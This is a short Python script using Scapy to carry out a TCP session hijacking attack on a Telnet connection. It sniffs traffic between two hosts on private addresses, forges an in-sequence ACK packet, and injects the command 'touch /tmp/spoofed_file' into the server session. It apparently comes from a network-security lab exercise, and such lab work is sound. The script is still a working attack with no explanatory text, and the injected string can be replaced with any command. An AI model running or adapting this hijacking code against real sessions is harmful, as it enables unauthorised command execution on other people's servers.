#!/usr/bin/python3
from scapy.all import *

IP_SRC = '10.0.2.6' #client
IP_DST = '10.0.2.8' #server

def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]

    newseq = old_tcp.seq + 5
    newack = old_tcp.ack + 1
    ip = IP(src = IP_SRC, dst = IP_DST)
    tcp = TCP(sport = old_tcp.sport, dport = 23, flags = 'A',
     seq = newseq, ack = newack)
    data = '\n touch /tmp/spoofed_file \n'
    pkt = ip/tcp/data
    ls(pkt)
    print("Sending session hijacking packet")
    send(pkt, verbose = 0)
    quit()

f = 'tcp and src host 10.0.2.6 and dst host 10.0.2.8 and dst port 23'

sniff(filter = f, prn = spoof)


